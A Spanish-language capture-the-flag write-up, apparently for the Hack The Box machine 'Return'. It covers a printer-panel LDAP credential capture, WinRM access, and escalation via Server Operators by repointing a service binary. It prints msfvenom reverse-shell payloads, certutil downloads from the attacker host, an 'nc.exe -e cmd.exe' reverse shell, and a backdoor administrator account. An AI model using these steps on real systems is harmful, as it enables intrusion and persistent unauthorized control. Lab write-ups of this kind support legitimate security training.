---
layout: post
title: HTB Return
date: '2023-12-20 15:50:44 -0500'
categories: [HTB, Easy]
tags: [Web, AD, Printer, Windows, Groups, Services , WinRM , NC  ] 
image:
  path: /return/preview.png
  alt: Return
---

## Resumen 
![logo](/return/logo.png){: .right w="200" h="200" }

**Return** es un **Domain Controller** al que hay que lograr ganar intrusión mediante una forma bastante curiosa. Al revisar la **web**, se tiene acceso a un panel de configuración de una **impresora**, donde al interceptar la petición se puede ver que el único valor que viaja es la **dirección IP**. Al cambiarla por la nuestra, nos llega la **contraseña** del usuario que corre ese servicio. Luego, ya dentro del equipo, al revisar los grupos a los que pertenece, se puede ver que está dentro del **grupo** encargado de modificar los **servicios** del equipo. Por lo que puede intentar modificar uno existente para ganar una **shell reversa** como el usuario de **máximos privilegios** dentro del sistema. Fue una máquina divertida y entretenida, además, como en casi todas las máquinas de **HTB**, siempre se aprende algo nuevo.


## Reconocimiento
Para empezar, se realiza un ping a la máquina para ver si se tiene conexión con ella:

```bash
ping 10.10.11.108 -c  1
PING 10.10.11.108 (10.10.11.108) 56(84) bytes of data.
64 bytes from 10.10.11.108: icmp_seq=1 ttl=127 time=202 ms

--- 10.10.11.108 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 201.985/201.985/201.985/0.000 ms
```
{: .nolineno}

### Escaneo de Puertos

Ahora se puede realizar un escaneo de puertos para ver cuáles se encuentran abiertos con ayuda de nmap:

```bash
nmap -p- --min-rate 2000 10.10.11.108 -Pn -oG ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-20 16:30 EST
Nmap scan report for 10.10.11.108
Host is up (0.17s latency).
Not shown: 65510 closed tcp ports (conn-refused)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49679/tcp open  unknown
49682/tcp open  unknown
49697/tcp open  unknown
65315/tcp open  unknown
```
{: .nolineno}

Con esta información, se puede revisar qué servicio se encuentra corriendo en cada puerto para tener información más detallada sobre la tecnología que se utiliza.

```bash
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,47001,49664,49665,49666,49668,49671,49674,49675,49679,49682,49697,65315 -sVC -Pn -oN versions 10.10.11.108
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-20 16:34 EST
Nmap scan report for 10.10.11.108
Host is up (0.18s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-20 22:52:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
65315/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1h18m34s
| smb2-time: 
|   date: 2023-12-20T22:53:55
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```
{: .nolineno}

Por los puertos y los servicios que se encuentran corriendo dentro del servidor, se puede concluir que es un **controlador de dominio**; esto es gracias a **Kerberos**, el servidor **LDAP**, el servidor **DNS**, entre muchos otros.


## Enumeración

### Web 

Al revisar la web, se puede ver que es un sitio web relacionado con el funcionamiento de una **impresora**.

![web](/return/web.png)

Al revisar las tecnologías que se están utilizando, son las siguientes:

```bash
whatweb http://10.10.11.108/

http://10.10.11.108/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.108], Microsoft-IIS[10.0], PHP[7.4.13], Script, Title[HTB Printer Admin Panel], X-Powered-By[PHP/7.4.13]
```
{: .nolineno}


También existe una pestaña llamada 'Settings' en la que se encuentra bastante información importante:

- Un usuario
- Una posible "Contraseña"
- Un puerto 
- Un subdominio

![settings](/return/settings.png)

Pero estos valores pueden ser cambiados, por lo que se van a interceptar en una **petición** para intentar manipularlos con ayuda de **Burp Suite**:

![petecion](/return/petcion.png)

## Explotación 

Se observa que el único valor que está viajando en la petición es la **dirección IP**, por lo que se puede intentar cambiarla para que apunte a nuestro equipo y ver qué sucede. Sin embargo, la petición tiene que llegar a un **puerto**, por lo que se puede pensar que será al puerto que se veía reflejado en la configuración, es decir, el **389**. Ahora, con esto en mente, sería necesario ponerse a la escucha con **nc** en ese puerto y cambiar la IP a la de nuestro equipo atacante.

```bash
nc -lvp  389
listening on [any] 389 ...
```
{: .nolineno}


![cambioIP](/return/cambioIP.png)

Al revisar la conexión por **nc**, se puede ver lo siguiente:

```bash
nc -lvp  389
listening on [any] 389 ...
10.10.11.108: inverse host lookup failed: Unknown host
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.108] 53030
0*`%return\svc-printer
                      1edFg43012!!
```
{: .nolineno}

De esta respuesta, se recibe un mensaje con el **dominio** ,  el **usuario** y en la línea siguiente se puede ver algo que parece ser una **contraseña** del usuario.


Por lo que ahora se puede probar con cme para verificar si las credenciales son válidas dentro del equipo:

```bash
crackmapexec smb  10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
```
{: .nolineno}

Ahora se puede probar si se tiene acceso por medio de WinRM, por lo que se ejecuta el siguiente comando:

```bash
crackmapexec winrm  10.10.11.108 -u 'svc-printer' -p '1edFg43012!!'
SMB         10.10.11.108    5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)
HTTP        10.10.11.108    5985   PRINTER          [*] http://10.10.11.108:5985/wsman
WINRM       10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```
{: .nolineno}

Por lo que se puede realizar la conexión por medio de **Evil-WinRM**:

```bash
evil-winrm -i 10.10.11.108 -u svc-printer  -p '1edFg43012!!'
                                        
Evil-WinRM shell v3.5
                                        
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```
{: .nolineno}

## Escalada de Privilegios

Ahora que se encuentra dentro del equipo, al revisar la información del usuario se puede ver que pertenece a un **grupo especial** llamado **Server Operators**. Por lo tanto, se puede investigar un poco más sobre él. Esto se puede confirmar con los siguientes comandos:

 ```bash
net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 12:15:13 AM
Password expires             Never
Password changeable          5/27/2021 12:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2021 12:39:29 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
 ```
{: .nolineno}

```bash
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```
{: .nolineno}


### Metodo 1 

Se puede crear un ejecutable malicioso que envíe una shell reversa al equipo del atacante. Para eso, es necesario utilizar MSFvenom:

```bash
msfvenom -p windows/x64/shell/reverse_tcp lhost=10.10.14.17 lport=8888 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
```
{: .nolineno}

Se puede transferir el archivo con certutil.exe , pero para eso es necesario montar un servidor para que el archivo sea consumido:

```bash
python3 -m http.server 8081
```
{: .nolineno}

```bash
certutil.exe -urlcache -f http://10.10.14.17:8081/shell.exe binariobonito.exe 
****  Online  ****
CertUtil: -URLCache command completed successfully.
```
{: .nolineno}


Ahora es necesario listar los servicios y elegir alguno que cuente con privilegios elevados.


```powershell
services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc    
*Evil-WinRM* PS C:\Users\svc-printer\Documents>
```

En este caso, se va a elegir el servicio VMTools y se va a cargar el ejecutable que se subió con ayuda de **sc.exe**:

```powershell
sc.exe config VMTools binpath="C:\Users\svc-printer\Documents\binariobonito.exe"

[SC] ChangeServiceConfig SUCCESS
```
{: .nolineno}


Ahora es necesario detener el servicio.

```powershell
sc.exe stop VMTools
SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
{: .nolineno}


Ponerse a la escucha en el puerto que fue escogido para el binario.
```bash
nc -lvp 8888
```
{: .nolineno}


Ponerse a la escucha en el puerto que fue escogido para el binario.
```powershell
sc.exe start VMTools
```
{: .nolineno}


Y con eso se gana una shell reversa como **NT AUTHORITY**




### Metodo 2 

Para este método, el procedimiento es el mismo, pero se puede subir un binario de  [nc](https://github.com/int0x33/nc.exe/blob/master/nc.exe) compatible con el sistema y ponerlo a correr en el servicio.

```powershell
certutil.exe -urlcache -f http://10.10.14.17:8081/nc.exe nc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```
{: .nolineno}


Se debe configurar el servicio para que ejecute el binario con el comando necesario.


```powershell
sc.exe config VMTools binpath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.17 1234"
```
{: .nolineno}

Detener el servicio , ponerse a la escucha y ejecutarlo respectivamente:

```powershell
sc.exe stop VMTools
```
{: .nolineno}


```bash
nc -lvp 1234
```
{: .nolineno}

```powershell
sc.exe start VMTools
```
{: .nolineno}


Y con eso se gana una shell de maximos privilegios dentro del sistema.

```bash
nc -lvp  1234
listening on [any] 1234 ...
10.10.11.108: inverse host lookup failed: Unknown host
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.108] 57535
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Obtener Shell Estable

Ahora, el problema es que la shell que se obtiene se cae después de un tiempo. Por lo que es necesario buscar una solución y, de paso, asegurar permanencia dentro del equipo. La solución para esto es **crear un usuario** y otorgarle **altos privilegios** antes de que se caiga, para así interactuar con el equipo de la forma más cómoda.

Para crear el usuario se puede hacer ayuda del comando net:

```powershell
net user madlies Password123! /add
```
{: .nolineno}


Y para darle altos privilegios se puede usar el comando


```powershell
net localgroup Administrators madlies /add
```
{: .nolineno}


Por lo que con esto ya se puede conectar de forma remota en el equipo con ayuda de **Evil-WinRM** y buscar la flag.


```bash
evil-winrm -i 10.10.11.108 -u madlies  -p 'Password123!'
                                        
Evil-WinRM shell v3.5
                                        
*Evil-WinRM* PS C:\Users\madlies\Documents> whoami
return\madlies
*Evil-WinRM* PS C:\Users\madlies\Documents> 
```
{: .nolineno}














